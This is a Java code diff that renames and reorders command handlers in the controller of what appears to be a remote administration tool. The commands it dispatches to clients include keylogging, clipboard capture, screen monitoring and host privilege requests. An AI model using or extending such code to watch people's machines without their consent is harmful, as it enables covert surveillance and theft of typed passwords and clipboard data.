@@ -14,12 +14,12 @@ public class ProduceController {
     private static Map<String, ProduceExecutable<Admin>> controller = new HashMap();
 
     public static void init() {
+        put(COMMAND_CLIENT_SYSTEM_USAGE, ProduceController::getClientSystemUsage);
         put(COMMAND_GET_HOST_PRIVILEGE, ProduceController::getHostPrivilege);
-        put(COMMAND_CLIENT_SYSTEM_USAGE, ProduceController::getMonitoring);
+        put(COMMAND_CLIENT_MONITOR, ProduceController::getClientMonitor);
         put(COMMAND_CLIENT_CLIPBOARD, ProduceController::getClipboard);
         put(COMMAND_CLIENT_KEYLOGGER, ProduceController::getKeylogger);
         put(COMMAND_CLIENT_PROCESS, ProduceController::getProcess);
-        put(COMMAND_CLIENT_MONITOR, ProduceController::getScreen);
         put(COMMAND_GET_CLIENTS, ProduceController::getClients);
     }
 
@@ -27,11 +27,11 @@ public class ProduceController {
         return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_CLIENT_PROCESS).json();
     }
 
-    private static String getScreen(Admin admin) {
+    private static String getClientMonitor(Admin admin) {
         return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_CLIENT_MONITOR).json();
     }
 
-    private static String getMonitoring(Admin admin) {
+    private static String getClientSystemUsage(Admin admin) {
         return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_CLIENT_SYSTEM_USAGE).json();
     }
 
